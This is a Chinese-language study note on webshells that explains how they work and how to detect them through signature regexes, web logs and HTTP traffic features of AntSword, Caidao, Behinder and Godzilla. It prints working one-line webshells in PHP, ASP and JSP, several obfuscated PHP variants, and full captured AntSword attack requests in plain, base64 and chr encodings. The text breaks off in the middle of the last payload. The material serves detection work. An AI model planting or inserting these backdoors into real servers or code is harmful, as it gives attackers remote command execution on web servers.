# Webshell

---

- [Webshell](#webshell)
  - [Webshell 简介](#webshell-简介)
  - [WebShell 分析](#webshell-分析)
    - [分析Webshell内容](#分析webshell内容)
    - [分析日志文件](#分析日志文件)
    - [分析 HTTP 流量](#分析-http-流量)


----

## Webshell 简介

顾名思义, WebShell 即为可以通过 Web 交互的 Shell, 是一种网页后门; WebShell 的形式通常为 PHP, ASP, ASPX, JSP, JSPX 等等(还有比较特殊的无文件落地的内存马);攻击者可以将WebShell后门文件放置到网站服务器的Web目录中，然后利用浏览器或WebShell管理工具访问这些后门，获取命令执行环境，从而控制网站或Web服务器。

---

以 PHP 语言为例, 简单的一句话木马可以是

```php
<?php echo shell_exec($_GET['cmd']);?>
```

它使用 `shell_exec` 函数执行 GET 参数 cmd 的值，并将结果输出到网页上：，将该文件放到目标网站的Web目录下，访问该文件的同时携带想要执行的代码，例如访问 `http://ip:port/get_shell.php?cmd=cat /etc/issue`  结果会返回服务器端的系统版本信息

![image-20231102080338284](http://cdn.ayusummer233.top/DailyNotes/202311020803353.png)

---

WebShell 按照功能可以分为

- 大马：大马WebShell功能齐全，能够管理数据库、文件管理、信息收集、提权等。由于这种大型木马的体量比较大，上传过程中容易被检测且不方便进行上传绕过测试。

- 小马：小马的功能通常是围绕文件管理的功能（文件上传、文件修改、新建文件等），在上传文件的时候，可能会出现被限制上传的文件大小或是被拦截的情况，可以通过小马来上传大马。

- 一句话木马：短小精悍、功能强大、隐蔽性好、使用客户端可以快速管理WebShell。

  简单的一句话木马举例

  - PHP: `<?php @eval($_POST['password']);?>`
  - ASP: `<%execute request("password")%>`
  - JSP: `<%Runtime.getRuntime().exec(request.getParameter("password"));%>`

---

WebShell 的利用前提

- WebShell 后门文件可以被放置在服务器的Web目录
- 攻击者知道WebShell文件的具体位置及文件名并且能访问到
- WebShell能被服务器解析执行
- WebShell 文件没有被杀毒软件查杀

---

## WebShell 分析

攻击者入侵服务器, 使用 Webshell, 首先可以想到的是根据 webshell 内容做静态特征检测; 其次 webshell 运行后也可以在 HTTP交互中找到一些特征

如下情况可能表明当前网站中存在 Webshell

- 服务器使用率非常高（可能是因为攻击者在上传和下载大量数据）
- 服务器上存在外来文件
- 具有可疑名称的文件
- 服务器端日志中存在未知连接

因此可以监控服务器 Web 目录的文件修改与落地的行为

- 对于非文件上传目录下的文件修改与落地的行为进行记录并分析器内容
- 对于文件上传目录中的文件也可以检测其后缀是否是 `php, asp, jsp, jspx` 等危险后缀
- 对于服务器的文件解析配置的修改也需要注意, 例如在某些情况下也许是配置出了问题也许是攻击者利用了某些漏洞, 会导致服务器配置中可以将非 php 的代码当做 php 文件来解析

---

### 分析Webshell内容

> [正则表达式可视化工具 | 菜鸟工具 (runoob.com)](https://c.runoob.com/front-end/7625/)
>
> [regex101: build, test, and debug regex](https://regex101.com/)
>
> ----
>
> [tennc/webshell: This is a webshell open source project --- tennc/webshell：这是一个webshell开源项目 (github.com)](https://github.com/tennc/webshell)
>
> [Webshell的检测与分析 - 游侠安全网 (youxia.org)](https://www.youxia.org/2023/06/107954.html)
>
> ---
>
> [tennc/webshell: This is a webshell open source project --- tennc/webshell：这是一个webshell开源项目 (github.com)](https://github.com/tennc/webshell)
>
> ---
>
> [机器学习检测WebShell脚本实践 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/254913.html)

静态检测通过匹配特征码,危险函数等来查找 Webshell, 对于已知的 WebShell 查找的准确率比较高

很多 Webshell 中都会使用到 eval 函数, 因其可以很方便地将其参数作为代码进行解析, 甚至不少漏洞就是因为开发者滥用 eval 导致的, 因此也有 `eval is evil` 的说法

- PHP:  `<?php @eval($_POST['caidao']);?>`
- ASP:  `<%eval request("caidao")%>`
- ASP.NET:  `<%@ Page Language="Jscript"%><%eval(Request.Item["caidao"],"unsafe");%>`

例如对于 PHP Webshell 可以有如下正则进行匹配

```php
<\?php.{1,32}(\b(eval|assert)\(.*(\$_GET|\$_POST|\$_SESSION|\$_REQUEST|\$_FILES|\$_GLOBAL)\[.*\]).{1,12}
```

![image-20231102094144156](http://cdn.ayusummer233.top/DailyNotes/202311020942134.png)

以及更多的或严格或宽泛的正则, 如:

> [机器学习检测WebShell脚本实践 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/254913.html)

```php
rule=r'(array_map[\s\n]{0,20}\(.{1,5}(eval|assert|ass\\x65rt).{1,20}\$_(GET|POST|REQUEST).{0,15})'
rule='(call_user_func[\s\n]{0,25}\(.{0,25}\$_(GET|POST|REQUEST).{0,15})'
rule='(\$_(GET|POST|REQUEST)\[.{0,15}\]\s{0,10}\(\s{0,10}\$_(GET|POST|REQUEST).{0,15})'
rule='((\$(_(GET|POST|REQUEST|SESSION|SERVER)(\[[\'"]{0,1})\w{1,12}([\'"]{0,1}\])|\w{1,10}))[\s\n]{0,20}\([\s\n]{0,20}(@{0,1}\$(_(GET|POST|REQUEST|SESSION|SERVER)(\[[\'"]{0,1})\w{1,12}([\'"]{0,1}\])|\w{1,10}))[\s\n]{0,5}\))'
rule='\s{0,10}=\s{0,10}[{@]{0,2}(\$_(GET|POST|REQUEST)|file_get_contents|str_replace|["\']a["\']\.["\']s["\']\.|["\']e["\']\.["\']v["\']\.|["\']ass["\']\.).{0,10}'
rule='((eval|assert)[\s|\n]{0,30}\([\s|\n]{0,30}(\\\\{0,1}\$((_(GET|POST|REQUEST|SESSION|SERVER)(\[[\'"]{0,1})[\w\(\)]{0,15}([\'"]{0,1}\]))|\w{1,10}))\s{0,5}\))'
rule='((eval|assert)[\s|\n]{0,30}\((gzuncompress|gzinflate\(){0,1}[\s|\n]{0,30}base64_decode.{0,100})'
rule='\s{0,10}=\s{0,10}([{@]{0,2}\\\\{0,1}\$_(GET|POST|REQUEST)|file_get_contents|["\']a["\']\.["\']s["\']\.|["\']e["\']\.["\']v["\']\.|["\']ass["\']\.).{0,20}'
rule='(include|require)(_once){0,1}[\s*]+[\"|\']+[0-9A-Za-z_]*\://'
rule='([^\'"](include|require)(_once){0,1}\s{0,5}(\s{0,5}|\(\s{0,5})["\']([\.\w\,/\\\+-_]{1,60})["\']\s*\){0,1})'
rule='((include|require)(_once){0,1}(\s{0,5}|\s{0,5}\(\s{0,5})[\'"]{0,1}(\$(_(GET|POST|REQUEST|SERVER)(\[[\'"]{0,1})\w{0,8}([\'"]{0,1}\])|[\w]{1,15}))[\'"]{0,1})'
rule='\s{0,10}=\s{0,10}([{@]{0,2}\$_(GET|POST|REQUEST)|[\'"]{0,1}php://input[\'"]{0,1}|file_get_contents).{0,20}'
rule='gzdeflate|gzcompress|gzencode'
rule = '(preg_replace[\s\n]{0,10}\([\s\n]{0,10}((["\'].{0,15}[/@\'][is]{0,2}e[is]{0,2}["\'])|\$[a-zA-Z_][\w"\'\[\]]{0,15})\s{0,5},\s{0,5}.{0,40}(\$_(GET|POST|REQUEST|SESSION|SERVER)|str_rot13|urldecode).{0,30})' 
```

---

对于 jsp 马而言则可以是代码执行 `java.lang.Runtime.getRuntime().exec`, Java反射（`ClassLoader`，`getClass().getClassLoader()`, `(Runtime) Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null)`）等特征

---

除了检测特征码,危险函数外, 还可以对文件本身哈希判断来检测已知 webshell, 文件时间聚类找出异于正常Web文件的可以文件,文件关联度计算找出相对其他Web文件孤立的可疑文件, 文件所在路径是否是非常规文件上传或Web页面路径等等;

除此以外还可以针对一些已知的常见绕过方式做检测, 例如文件格式/后缀是否异常(大小写后缀, 多重后缀, chr(0)等)

对于编码,混淆的 WebShell 则需要相应解码,辨认混淆才能确认是否为 Webshell. 例如

```php
<?php
if($_GET['exec']==="0"){
exit;
}else if($_GET['exec']==="1"){
call_user_func(function() {
$cmd = function($params){
extract($params);
$a($b);
};
$cmd($_REQUEST);
});
}
```

extract函数注册了数组中的键为变量名，值为变量的值，这里接收 `$_REQUEST`，然后利用变量函数执行 `$a($b)`,所以只要传参数`exec=1&a=system&b=whoami`，即可执行，等同于 `system(whoami)`

或者是简单地拆分替换关键字符串

```php
<?php 
    $a = 'a'.'s'.'s'.'e'.'r'.'t';
    $a($_POST['x']);
?>
    
#################################
<?php 
  $a = substr('1a',1).'s'.'s'.'e'.'r'.'t';
  $a($_POST['x']);
?>
    
###########
<?php 
    $a = strtr('azxcvt','zxcv','sser');
    $a($_POST['x']);
?>
    
##########
<?php 
    $a = substr_replace("asxxx","sert",2);
    $a($_POST['x']);
?>  
```

总的来说静态的内容分析主要用于检测已知Webshell, 针对新的绕过方案打补丁, 是个依赖补丁不断对抗的过程

在 Github 上有不少项目会收集各类 WebShell, 可以作为分析材料, 例如 [tennc/webshell: This is a webshell open source project](https://github.com/tennc/webshell)

---

### 分析日志文件

> [webshell检测方法归纳 - he1m4n6a - 博客园 (cnblogs.com)](https://www.cnblogs.com/he1m4n6a/p/9245155.html)

使用 WebShell 一般不会在系统日志中留下记录, 但是会在 Web 日志中留下 WebShell 页面的访问记录, 例如:

![image-20231102113442996](http://cdn.ayusummer233.top/DailyNotes/202311021134951.png)

WebShell 访问的特征可以是:

- 少量 ip 对其发起访问
- 总的访问次数较少
- 访问的页面是孤立的页面, 很少有其他 IP 也访问了此页面

---

### 分析 HTTP 流量

> [AntSwordProject/antSword: 中国蚁剑是一款跨平台的开源网站管理工具。AntSword is a cross-platform website management toolkit. (github.com)](https://github.com/AntSwordProject/antSword)
>
> [raddyfiy/caidao-official-version: 中国菜刀官方版本，拒绝黑吃黑，来路清晰 (github.com)](https://github.com/raddyfiy/caidao-official-version)

> [四大主流WebShell管理工具分析 | 防守方攻略 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/362011041)
>
> [常见webshell工具及特征分析 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/324622.html)
>
> [Webshell研究综述：检测与对抗技术的动态博弈进展 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/259985000)

攻击者通过 WebShell 与服务器交互时的流量也可以用于监测可以的 WebShell 通信, 例如 POST 请求包:

```http
POST /vul/joker.php HTTP/1.1
Host: 100.1.1.131:9221
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-gb) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27
Content-Type: application/x-www-form-urlencoded
Content-Length: 1798
Connection: close

shell=%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3B%24opdir%3D%40ini_get(%22open_basedir%22)%3Bif(%24opdir)%20%7B%24ocwd%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3B%24oparr%3Dpreg_split(base64_decode(%22Lzt8Oi8%3D%22)%2C%24opdir)%3B%40array_push(%24oparr%2C%24ocwd%2Csys_get_temp_dir())%3Bforeach(%24oparr%20as%20%24item)%20%7Bif(!%40is_writable(%24item))%7Bcontinue%3B%7D%3B%24tmdir%3D%24item.%22%2F.c99485cd59f%22%3B%40mkdir(%24tmdir)%3Bif(!%40file_exists(%24tmdir))%7Bcontinue%3B%7D%24tmdir%3Drealpath(%24tmdir)%3B%40chdir(%24tmdir)%3B%40ini_set(%22open_basedir%22%2C%20%22..%22)%3B%24cntarr%3D%40preg_split(%22%2F%5C%5C%5C%5C%7C%5C%2F%2F%22%2C%24tmdir)%3Bfor(%24i%3D0%3B%24i%3Csizeof(%24cntarr)%3B%24i%2B%2B)%7B%40chdir(%22..%22)%3B%7D%3B%40ini_set(%22open_basedir%22%2C%22%2F%22)%3B%40rmdir(%24tmdir)%3Bbreak%3B%7D%3B%7D%3B%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%22f472c%22.%22192e4%22%3Becho%20%40asenc(%24output)%3Becho%20%22e2d3%22.%2210560%22%3B%7Dob_start()%3Btry%7B%24D%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3Bif(%24D%3D%3D%22%22)%24D%3Ddirname(%24_SERVER%5B%22PATH_TRANSLATED%22%5D)%3B%24R%3D%22%7B%24D%7D%09%22%3Bif(substr(%24D%2C0%2C1)!%3D%22%2F%22)%7Bforeach(range(%22C%22%2C%22Z%22)as%20%24L)if(is_dir(%22%7B%24L%7D%3A%22))%24R.%3D%22%7B%24L%7D%3A%22%3B%7Delse%7B%24R.%3D%22%2F%22%3B%7D%24R.%3D%22%09%22%3B%24u%3D(function_exists(%22posix_getegid%22))%3F%40posix_getpwuid(%40posix_geteuid())%3A%22%22%3B%24s%3D(%24u)%3F%24u%5B%22name%22%5D%3A%40get_current_user()%3B%24R.%3Dphp_uname()%3B%24R.%3D%22%09%7B%24s%7D%22%3Becho%20%24R%3B%3B%7Dcatch(Exception%20%24e)%7Becho%20%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3B
```

响应包:

```http
HTTP/1.1 200 OK
Date: Thu, 02 Nov 2023 03:11:27 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 168
Connection: close
Content-Type: text/html; charset=UTF-8

<!-- 基础的一句话木马 -->
f472c192e4/var/www/html/vul	/	Linux 7c1128c925de 5.10.0-kali3-amd64 #1 SMP Debian 5.10.13-1kali1 (2021-02-08) x86_64	www-datae2d310560
```

---

一般情况下, 公开的用于渗透测试的 Webshell 管理工具都会配置一些默认的特征, 例如默认的 User-Agent 等等, 例如蚁剑的 `User-Agent` 默认为 `antSword/v版本号`

一般情况下, Webshell 管理工具默认会对交互进行编码, 比较常见的默认项为 base64 编解码, 因此在默认的交互流量中看到诸如 `base64`, `base64_encode`, `base64_decode` 等特征

除此以外Webshell 也会提供一些默认的编解码器来对传输的数据进行编码, 针对这些默认的编码器的流量

- 中国菜刀：经典的网站管理工具，使用一句话木马作为服务端，通信流量中存在eval、base64_decode等关键字，请求头中的User-Agent默认为百度爬虫
- 中国蚁剑：开源的网站管理工具，支持多种编码器和自定义头部字段，请求头中的User-Agent默认为 `antSword/v版本号`
- 冰蝎：动态二进制加密的网站管理工具，使用预共享密钥进行加密传输，请求头中存在 `Pragma: no-cache`，`Cache-Control: no-cache` 等特征
- 哥斯拉：支持多种加密方式和自定义参数，请求头中存在 `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8`等特征

---

以蚁剑为例, 默认的 WebShell 通信:

![image-20231102141338838](./Webshell.assets/image-20231102141338838.png)

默认不编码时最明显的特征是 `@ini_set(“display_errors”,”0″)`，`@set_time_limit(0)`

使用默认编码器编码后仍可以根据以该字符串为依据进行检测, 如:

| 编码方案 |                           编码结果                            |
| :------: | :-----------------------------------------------------------: |
| default  |                           `@ini_s`                            |
|  base64  |                          `QGluaV9z`                           |
|   chr    |     `cHr(64).ChR(105).ChR(110).ChR(105).ChR(95).ChR(115)`     |
|  chr16   | `cHr(0x40).ChR(0x69).ChR(0x6e).ChR(0x69).ChR(0x5f).ChR(0x73)` |
|  rot13   |                   `%40vav_f`<br>`%40 -> @`                    |

Base64编码:

```http
POST /vul/joker.php HTTP/1.1
Host: 100.1.1.131:9221
Accept-Encoding: gzip, deflate
User-Agent: Opera/9.80 (Windows NT 6.1; WOW64; U; pt) Presto/2.10.229 Version/11.62
Content-Type: application/x-www-form-urlencoded
Content-Length: 1752
Connection: close

b7d8e0e90bcb44=P5L3Zhci93d3cvaHRtbC92dWwv&idfb39758ca345=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7JG9wZGlyPUBpbmlfZ2V0KCJvcGVuX2Jhc2VkaXIiKTtpZigkb3BkaXIpIHskb2N3ZD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7JG9wYXJyPXByZWdfc3BsaXQoYmFzZTY0X2RlY29kZSgiTHp0OE9pOD0iKSwkb3BkaXIpO0BhcnJheV9wdXNoKCRvcGFyciwkb2N3ZCxzeXNfZ2V0X3RlbXBfZGlyKCkpO2ZvcmVhY2goJG9wYXJyIGFzICRpdGVtKSB7aWYoIUBpc193cml0YWJsZSgkaXRlbSkpe2NvbnRpbnVlO307JHRtZGlyPSRpdGVtLiIvLmYyM2Q4IjtAbWtkaXIoJHRtZGlyKTtpZighQGZpbGVfZXhpc3RzKCR0bWRpcikpe2NvbnRpbnVlO30kdG1kaXI9cmVhbHBhdGgoJHRtZGlyKTtAY2hkaXIoJHRtZGlyKTtAaW5pX3NldCgib3Blbl9iYXNlZGlyIiwgIi4uIik7JGNudGFycj1AcHJlZ19zcGxpdCgiL1xcXFx8XC8vIiwkdG1kaXIpO2ZvcigkaT0wOyRpPHNpemVvZigkY250YXJyKTskaSsrKXtAY2hkaXIoIi4uIik7fTtAaW5pX3NldCgib3Blbl9iYXNlZGlyIiwiLyIpO0BybWRpcigkdG1kaXIpO2JyZWFrO307fTs7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuICRvdXQ7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiNDhiZiIuIjk2MjM3IjtlY2hvIEBhc2VuYygkb3V0cHV0KTtlY2hvICJhODdkYSIuImFiOGM3Ijt9b2Jfc3RhcnQoKTt0cnl7JEQ9YmFzZTY0X2RlY29kZShzdWJzdHIoJF9QT1NUWyJiN2Q4ZTBlOTBiY2I0NCJdLDIpKTskRj1Ab3BlbmRpcigkRCk7aWYoJEY9PU5VTEwpe2VjaG8oIkVSUk9SOi8vIFBhdGggTm90IEZvdW5kIE9yIE5vIFBlcm1pc3Npb24hIik7fWVsc2V7JE09TlVMTDskTD1OVUxMO3doaWxlKCROPUByZWFkZGlyKCRGKSl7JFA9JEQuJE47JFQ9QGRhdGUoIlktbS1kIEg6aTpzIixAZmlsZW10aW1lKCRQKSk7QCRFPXN1YnN0cihiYXNlX2NvbnZlcnQoQGZpbGVwZXJtcygkUCksMTAsOCksLTQpOyRSPSIJIi4kVC4iCSIuQGZpbGVzaXplKCRQKS4iCSIuJEUuIgoiO2lmKEBpc19kaXIoJFApKSRNLj0kTi4iLyIuJFI7ZWxzZSAkTC49JE4uJFI7fWVjaG8gJE0uJEw7QGNsb3NlZGlyKCRGKTt9O31jYXRjaChFeGNlcHRpb24gJGUpe2VjaG8gIkVSUk9SOi8vIi4kZS0%2BZ2V0TWVzc2FnZSgpO307YXNvdXRwdXQoKTtkaWUoKTs%3D&shell=%40eval(%40base64_decode(%24_POST%5B'idfb39758ca345'%5D))%3B
```

![image-20231102142847766](./Webshell.assets/image-20231102142847766.png)



chr

```http
POST /vul/joker.php HTTP/1.1
Host: 100.1.1.131:9221
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/22.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 10106
Connection: close

shell=%40eVAl(cHr(64).ChR(105).ChR(110).ChR(105).ChR(95).ChR(115).ChR(101).ChR(116).ChR(40).ChR(34).ChR(100).ChR(105).ChR(115).ChR(112).ChR(108).ChR(97).ChR(121).ChR(95).ChR(101).ChR(114).ChR(114).ChR(111).ChR(114).ChR(115).ChR(34).ChR(44).ChR(32).ChR(34).ChR(48).ChR(34).ChR(41).ChR(59).ChR(64).ChR(115).ChR(101).ChR(116).ChR(95).ChR(116).ChR(105).ChR(109).ChR(101).ChR(95).ChR(108).ChR(105).ChR(109).ChR(105).ChR(116).ChR(40).ChR(48).ChR(41).ChR(59).ChR(36).ChR(111).ChR(112).ChR(100).ChR(105).ChR(114).ChR(61).ChR(64).ChR(105).ChR(110).ChR(105).ChR(95).ChR(103).ChR(101).ChR(116).ChR(40).ChR(34).ChR(111).ChR(112).ChR(101).ChR(110).ChR(95).ChR(98).ChR(97).ChR(115).ChR(101).ChR(100).ChR(105).ChR(114).ChR(34).ChR(41).ChR(59).ChR(105).ChR(102).ChR(40).ChR(36).ChR(111).ChR(112).ChR(100).ChR(105).ChR(114).ChR(41).ChR(32).ChR(123).ChR(36).ChR(111).ChR(99).ChR(119).ChR(100).ChR(61).ChR(100).ChR(105).ChR(114).ChR(110).ChR(97).ChR(109).ChR(101).ChR(40).ChR(36).ChR(95).ChR(83).ChR(69).ChR(82).ChR(86).ChR(69).ChR(82).ChR(91).ChR(34).ChR(83).ChR(67).ChR(82).ChR(73).ChR(80).ChR(84).ChR(95).ChR(70).ChR(73).ChR(76).ChR(69).ChR(78).ChR(65).ChR(77).ChR(69).ChR(34).ChR(93).ChR(41).ChR(59).ChR(36).ChR(111).ChR(112).ChR(97).ChR(114).ChR(114).ChR(61).ChR(112).ChR(114).ChR(101).ChR(103).ChR(95).ChR(115).ChR(112).ChR(108).ChR(105).ChR(116).ChR(40).ChR(98).ChR(97).ChR(115).ChR(101).ChR(54).ChR(52).ChR(95).ChR(100).ChR(101).ChR(99).ChR(111).ChR(100).ChR(101).ChR(40).ChR(34).ChR(76).ChR(122).ChR(116).ChR(56).ChR(79).ChR(105).ChR(56).ChR(61).ChR(34).ChR(41).ChR(44).ChR(36).ChR(111).ChR(112).ChR(100).ChR(105).ChR(114).ChR(41).ChR(59).ChR(64).ChR(97).ChR(114).ChR(114).ChR(97).ChR(121).ChR(95).ChR(112).ChR(117).ChR(115).ChR(104).ChR(40).ChR(36).ChR(111).ChR(112).ChR(97).ChR(114).ChR(114).ChR(44).ChR(36).ChR(111).ChR(99).ChR(119).ChR(100).ChR(44).ChR(115).ChR(121).ChR(115).ChR(95).ChR(103).ChR(101).ChR(116).ChR(95).ChR(116).ChR(101).ChR(109).ChR(112).ChR(95).ChR(100).ChR(105).ChR(114).ChR(40).ChR(41).ChR(41).ChR(59).ChR(102).ChR(111).ChR(114).ChR(101).ChR(97).ChR(99).ChR(104).ChR(40).ChR(36).ChR(111).ChR(112).ChR(97).ChR(114).ChR(114).ChR(32).ChR(97).ChR(115).ChR(32).ChR(36).ChR(105).ChR(116).ChR(101).ChR(109).ChR(41).ChR(32).ChR(123).ChR(105).ChR(102).ChR(40).ChR(33).ChR(64).ChR(105).ChR(115).ChR(95).ChR(119).ChR(114).ChR(105).ChR(116).ChR(97).ChR(98).ChR(108).ChR(101).ChR(40).ChR(36).ChR(105).ChR(116).ChR(101).ChR(109).ChR(41).ChR(41).ChR(123).ChR(99).ChR(111).ChR(110).ChR(116).ChR(105).ChR(110).ChR(117).ChR(101).ChR(59).ChR(125).ChR(59).ChR(36).ChR(116).ChR(109).ChR(100).ChR(105).ChR(114).ChR(61).ChR(36).ChR(105).ChR(116).ChR(101).ChR(109).ChR(46).ChR(34).ChR(47).ChR(46).ChR(54).ChR(57).ChR(57).ChR(57).ChR(48).ChR(101).ChR(34).ChR(59).ChR(64).ChR(109).ChR(107).ChR(100).ChR(105).ChR(114).ChR(40).ChR(36).ChR(116).ChR(109).ChR(100).ChR(105).ChR(114).ChR(41).ChR(59).ChR(105).ChR(102).ChR(40).ChR(33).ChR(64).ChR(102).ChR(105).ChR(108).ChR(101).ChR(95).ChR(101).ChR(120).ChR(105).ChR(115).ChR(116).ChR(115).ChR(40).ChR(36).ChR(116).ChR(109).ChR(100).ChR(105).ChR(114).ChR(41).ChR(41).ChR(123).ChR(99).ChR(111).ChR(110).ChR(116).ChR(105).ChR(110).ChR(117).ChR(101).ChR(59).ChR(125).ChR(36).ChR(116).ChR(109).ChR(100).ChR(105).ChR(114).ChR(61).ChR(114).ChR(101).ChR(97).ChR(108).ChR(112).ChR(97).ChR(116).ChR(104).ChR(40).ChR(36).ChR(116).ChR(109).ChR(100).ChR(105).ChR(114).ChR(41).ChR(59).ChR(64).ChR(99).ChR(104).ChR(100).ChR(105).ChR(114).ChR(40).ChR(36).ChR(116).ChR(109).ChR(100).ChR(105).ChR(114).ChR(41).ChR(59).ChR(64).ChR(105).ChR(110).ChR(105).ChR(95).ChR(115).ChR(101).ChR(116).ChR(40).ChR(34).ChR(111).ChR(112).ChR(101).ChR(110).ChR(95).ChR(98).ChR(97).ChR(115).ChR(101).ChR(100).ChR(105).ChR(114).ChR(34).ChR(44).ChR(32).ChR(34).ChR(46).ChR(46).ChR(34).ChR(41).ChR(59).ChR(36).ChR(99).ChR(110).ChR(116).ChR(97).ChR(114).ChR(114).ChR(61).ChR(64).ChR(112).ChR(114).ChR(101).ChR(103).ChR(95).ChR(115).ChR(112).ChR(108).ChR(105).ChR(116).ChR(40).ChR(34).ChR(47).ChR(92).ChR(92).ChR(92).ChR(92).ChR(124).ChR(92).ChR(47).ChR(47).ChR(34).ChR(44).ChR(36).ChR(116).ChR(109).ChR(100).ChR(105).ChR(114).ChR(41).ChR(59).ChR(102).ChR(111).ChR(114).ChR(40).ChR(36).ChR(105).ChR(61).ChR(48).ChR(59).ChR(36).ChR(105).ChR(60).ChR(115).ChR(105).ChR(122).ChR(101).ChR(111).ChR(102).ChR(40).ChR(36).ChR(99).ChR(110).ChR(116).ChR(97).ChR(114).ChR(114).ChR(41).ChR(59).ChR(36).ChR(105).ChR(43).ChR(43).ChR(41).ChR(123).ChR(64).ChR(99).ChR(104).ChR(100).ChR(105).ChR(114).ChR(40).ChR(34).ChR(46).ChR(46).ChR(34).ChR(41).ChR(59).ChR(125).ChR(59).ChR(64).ChR(105).ChR(110).ChR(105).ChR(95).ChR(115).ChR(101).ChR(116).ChR(40).ChR(34).ChR(111).ChR(112).ChR(101).ChR(110).ChR(95).ChR(98).ChR(97).ChR(115).ChR(101).ChR(100).ChR(105).ChR(114).ChR(34).ChR(44).ChR(34).ChR(47).ChR(34).ChR(41).ChR(59).ChR(64).ChR(114).ChR(109).ChR(100).ChR(105).ChR(114).ChR(40).ChR(36).ChR(116).ChR(109).ChR(100).ChR(105).ChR(114).ChR(41).ChR(59).ChR(98).ChR(114).ChR(101).ChR(97).ChR(107).ChR(59).ChR(125).ChR(59).ChR(125).ChR(59).ChR(59).ChR(102).ChR(117).ChR(110).ChR(99).ChR(116).ChR(105).ChR(111).ChR(110).ChR(32).ChR(97).ChR(115).ChR(101).ChR(110).ChR(99).ChR(40).ChR(36).ChR(111).ChR(117).ChR(116).ChR(41).ChR(123).ChR(114).ChR(101).ChR(116).ChR(117).ChR(114).ChR(110).ChR(32).ChR(36).ChR(111).ChR(117).ChR(116).ChR(59).ChR(125).ChR(59).ChR(102).ChR(117).ChR(110).ChR(99).ChR(116).ChR(105).ChR(111).ChR(110).ChR(32).ChR(97).ChR(115).ChR(111).ChR(117).ChR(116).ChR(112).ChR(117).ChR(116).ChR(40).ChR(41).ChR(123).ChR(36).ChR(111).ChR(117).ChR(116).ChR(112).ChR(117).ChR(116).ChR(61).ChR(111).ChR(98).ChR(95).ChR(103).ChR(101).ChR(116).ChR(95).ChR(99).ChR(111).ChR(110).ChR(116).ChR(101).ChR(110).ChR(116).ChR(115).ChR(40).ChR(41).ChR(59).ChR(111).ChR(98).ChR(95).ChR(101).ChR(110).ChR(100).ChR(95).ChR(99).ChR(108).ChR(101).ChR(97).ChR(110).ChR(40).ChR(41).ChR(59).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(34).ChR(57).ChR(51).ChR(50).ChR(48).ChR(54).ChR(50).ChR(34).ChR(46).ChR(34).ChR(53).ChR(54).ChR(98).ChR(101).ChR(99).ChR(52).ChR(34).ChR(59).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(64).ChR(97).ChR(115).ChR(101).ChR(110).ChR(99).ChR(40).ChR(36).ChR(111).ChR(117).ChR(116).ChR(112).ChR(117).ChR(116).ChR(41).ChR(59).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(34).ChR(51).ChR(53).ChR(34).ChR(46).ChR(34).ChR(53).ChR(101).ChR(51).ChR(34).ChR(59).ChR(125).ChR(111).ChR(98).ChR(95).ChR(115).ChR(116).ChR(97).ChR(114).ChR(116).ChR(40).ChR(41).ChR(59).ChR(116).ChR(114).ChR(121).ChR(123).ChR(36).ChR(68).ChR(61).ChR(100).ChR(105).ChR(114).ChR(110).ChR(97).ChR(109).ChR(101).ChR(40).ChR(36).ChR(95).ChR(83).ChR(69).ChR(82).ChR(86).ChR(69).ChR(82).ChR(91).ChR(34).ChR(83).ChR(67).ChR(82).ChR(73).ChR(80).ChR(84).ChR(95).ChR(70).ChR(73).ChR(76).ChR(69).ChR(78).ChR(65).ChR(77).ChR(69).ChR(34).ChR(93).ChR(41).ChR(59).ChR(105).ChR(102).ChR(40).ChR(36).ChR(68).ChR(61).ChR(61).ChR(34).ChR(34).ChR(41).ChR(36).ChR(68).ChR(61).ChR(100).ChR(105).ChR(114).ChR(110).ChR(97).ChR(109).ChR(101).ChR(40).ChR(36).ChR(95).ChR(83).ChR(69).ChR(82).ChR(86).ChR(69).ChR(82).ChR(91).ChR(34).ChR(80).ChR(65).ChR(84).ChR(72).ChR(95).ChR(84).ChR(82).ChR(65).ChR(78).ChR(83).ChR(76).ChR(65).ChR(84).ChR(69).ChR(68).ChR(34).ChR(93).ChR(41).ChR(59).ChR(36).ChR(82).ChR(61).ChR(34).ChR(123).ChR(36).ChR(68).ChR(125).ChR(9).ChR(34).ChR(59).ChR(105).ChR(102).ChR(40).ChR(115).ChR(117).ChR(98).ChR(115).ChR(116).ChR(114).ChR(40).ChR(36).ChR(68).ChR(44).ChR(48).ChR(44).ChR(49).ChR(41).ChR(33).ChR(61).ChR(34).ChR(47).ChR(34).ChR(41).ChR(123).ChR(102).ChR(111).ChR(114).ChR(101).ChR(97).ChR(99).ChR(104).ChR(40).ChR(114).ChR(97).ChR(110).ChR(103).ChR(101).ChR(40).ChR(34).C